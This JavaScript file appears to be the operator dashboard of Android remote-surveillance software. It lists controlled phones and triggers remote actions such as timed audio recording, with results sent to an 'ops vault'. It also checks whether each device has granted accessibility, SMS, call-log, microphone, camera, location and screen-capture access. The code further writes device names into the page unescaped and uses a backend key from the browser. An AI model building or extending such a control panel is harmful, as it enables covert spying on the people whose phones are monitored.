class DashboardEngine {
    constructor() {
        this.activeDeviceId = localStorage.getItem('active_device_id');
        this.init();
    }

    async init() {
        await this.loadDevicesList();
        if (!this.activeDeviceId) return; 
        await this.loadDeviceMetrics();
        setInterval(() => this.loadDeviceMetrics(), 10000);
    }

    async loadDevicesList() {
        const token = localStorage.getItem('owner_token');
        try {
            const res = await fetch('/api/devices', {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();

            if (result.status === 'success') {
                const selectEl = document.getElementById('device-select');
                if (selectEl) {
                    selectEl.innerHTML = ''; 
                    if (result.data.length === 0) {
                        selectEl.innerHTML = '<option value="">No Devices Found</option>';
                        return;
                    }
                    result.data.forEach(dev => {
                        const option = document.createElement('option');
                        option.value = dev.id;
                        option.textContent = dev.name;
                        selectEl.appendChild(option);
                    });
                    if (!this.activeDeviceId && result.data.length > 0) {
                        this.activeDeviceId = result.data[0].id;
                        localStorage.setItem('active_device_id', this.activeDeviceId);
                    }
                    selectEl.value = this.activeDeviceId;
                    selectEl.addEventListener('change', (e) => {
                        this.activeDeviceId = e.target.value;
                        localStorage.setItem('active_device_id', this.activeDeviceId);
                        this.loadDeviceMetrics(); 
                    });
                }
            }
        } catch (e) {
            console.error("Failed to load devices list:", e);
        }
    }

    async loadDeviceMetrics() {
        const token = localStorage.getItem('owner_token');
        try {
            const res = await fetch('/api/devices', {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();
            if (result.status === 'success') {
                const dev = result.data.find(d => d.id === this.activeDeviceId);
                if (dev) this.populateMetadata(dev);
            }
        } catch (e) { console.error("Telemetry Fetch Error:", e); }
    }

    populateMetadata(dev) {
        const badge = document.getElementById('online-badge');
        if (badge) {
            badge.style.color = dev.online_status ? '#2ecc71' : '#e74c3c';
            badge.innerText = dev.online_status ? '● ONLINE' : '○ OFFLINE';
        }

        const batteryEl = document.getElementById('metric-battery');
        const batteryCard = document.getElementById('battery-card');
        const batteryState = document.getElementById('battery-state');
        if (batteryEl && batteryCard) {
            batteryEl.textContent = `${dev.battery_level || 0}%`;
            if (dev.is_charging) {
                batteryCard.className = 'flat-card bg-green';
                batteryState.textContent = 'Charging';
            } else {
                batteryCard.className = 'flat-card bg-red';
                batteryState.textContent = 'Discharging';
            }
        }

        const storageEl = document.getElementById('metric-storage');
        if (storageEl) storageEl.textContent = dev.storage_used || 'N/A';

        const nameEl = document.getElementById('info-name');
        if (nameEl) {
            nameEl.innerHTML = `
                <div style="font-size: 1.1rem; color: white;">
                    ${dev.name || 'Unknown'} <span style="font-size: 0.8rem; opacity: 0.8;">(${dev.model || ''})</span>
                </div>
                <button onclick="deleteDevice('${dev.id}')" style="margin-top: 8px; background: rgba(231, 76, 60, 0.2); color: #e74c3c; border: 1px solid #e74c3c; border-radius: 4px; padding: 4px 10px; cursor: pointer; font-size: 0.7rem; font-weight: bold; text-transform: uppercase;">
                    Remove Device
                </button>
            `;
        }
    }
}

// ==========================================
// 🚀 THE MASTER COMMAND DISPATCHER & REDIRECT ENGINE
// ==========================================

window.triggerCommand = async function(commandString, commandName) {
    const isConfirmed = confirm(`Are you sure you want to trigger: ${commandName}?`);
    if (!isConfirmed) return;

    // Special logic to append audio duration if it's the record command
    if (commandString === 'record_audio') {
        const durationElement = document.getElementById('audio-duration');
        if (durationElement) {
            commandString = `record_audio:${durationElement.value}`;
        }
    }

    const deviceId = localStorage.getItem('active_device_id');
    const token = localStorage.getItem('owner_token');
    
    if (!deviceId) {
        alert("Critical Error: No active device selected.");
        return;
    }

    try {
        const res = await fetch(`/api/devices/${deviceId}/action`, {
            method: 'POST',
            headers: { 
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ action: commandString }) 
        });
        
        const result = await res.json();
        
        if (result.status === 'success') {
            // 🚀 MAGIC REDIRECT: Seedha Ops Vault me bhej do!
            window.location.href = '/ops';
        } else {
            alert(`❌ Action Execution Failed: ${result.message}`);
        }
    } catch (e) {
        console.error("Action Execution Error:", e);
        alert("Network Error: Action API unreachable.");
    }
};

// Global Device Deletion
window.deleteDevice = async function(deviceId) {
    if (!confirm("WARNING: Are you sure you want to permanently remove this device?")) return;
    const token = localStorage.getItem('owner_token');
    try {
        const res = await fetch(`/api/devices/${deviceId}`, {
            method: 'DELETE',
            headers: { 'Authorization': `Bearer ${token}` }
        });
        const result = await res.json();
        if (result.status === 'success') {
            alert("Device removed.");
            localStorage.removeItem('active_device_id'); 
            window.location.reload(); 
        }
    } catch (e) {
        console.error("Delete Action Failed:", e);
    }
};

// ==========================================
// 🚀 DIAGNOSTICS & SETTINGS CHECK ENGINE
// ==========================================

window.openSettingsCheckModal = async () => {
    const modal = document.getElementById('diagnostics-modal');
    const content = document.getElementById('diagnostics-content');
    const deviceId = localStorage.getItem('active_device_id');

    if (!modal || !content) return;
    
    modal.style.display = 'flex';
    content.innerHTML = '<p style="color: #888; text-align: center; margin-top: 20px;">Fetching remote diagnostic data from Supabase...</p>';

    if (!deviceId) {
        content.innerHTML = '<p style="color: #e74c3c; text-align: center; margin-top: 20px;">No active device selected.</p>';
        return;
    }

    try {
        const configRes = await fetch('/api/config');
        const config = await configRes.json();
        
        // Supabase query to get the latest permission sync data for the active device
        const permRes = await fetch(`${config.supabase_url}/rest/v1/permissions?device_id=eq.${deviceId}&order=created_at.desc&limit=1`, {
            headers: {
                'apikey': config.supabase_key,
                'Authorization': `Bearer ${config.supabase_key}`
            }
        });

        const data = await permRes.json();

        if (!data || data.length === 0) {
            content.innerHTML = '<p style="color: #f39c12; text-align: center; margin-top: 20px;">No diagnostic data received from device yet.</p>';
            return;
        }

        const perms = data[0];
        
        // Matrix Map Builder
        const map = {
            'Accessibility (Core Engine)': perms.accessibility,
            'Location Tracking': perms.location,
            'Notification Access': perms.notification_access,
            'Storage & Media Files': perms.storage,
            'Microphone (Live Ops)': perms.microphone,
            'Camera Access': perms.camera,
            'Call Logs Parsing': perms.call_log,
            'SMS Message Sync': perms.sms,
            'Phone State Monitoring': perms.phone,
            'Screen Capture Overlay': perms.screen_recording
        };

        let html = '<div style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">';
        
        for (const [key, value] of Object.entries(map)) {
            const color = value ? '#2ecc71' : '#e74c3c';
            const icon = value ? '✔' : '✖';
            html += `
                <div style="display: flex; justify-content: space-between; align-items: center; background: #2a2a2a; padding: 12px 15px; border-radius: 6px; border-left: 4px solid ${color};">
                    <span style="font-weight: 600; color: #ddd; font-size: 14px;">${key}</span>
                    <span style="color: ${color}; font-weight: 900; font-size: 18px;">${icon}</span>
                </div>
            `;
        }
        html += '</div>';
        
        content.innerHTML = html;

    } catch (e) {
        console.error("Diagnostics Fetch Error:", e);
        content.innerHTML = '<p style="color: #e74c3c; text-align: center; margin-top: 20px;">Network Error. Failed to fetch diagnostics.</p>';
    }
};

window.closeSettingsCheckModal = () => {
    const modal = document.getElementById('diagnostics-modal');
    if (modal) modal.style.display = 'none';
};

document.addEventListener('DOMContentLoaded', () => {
    new DashboardEngine();
});
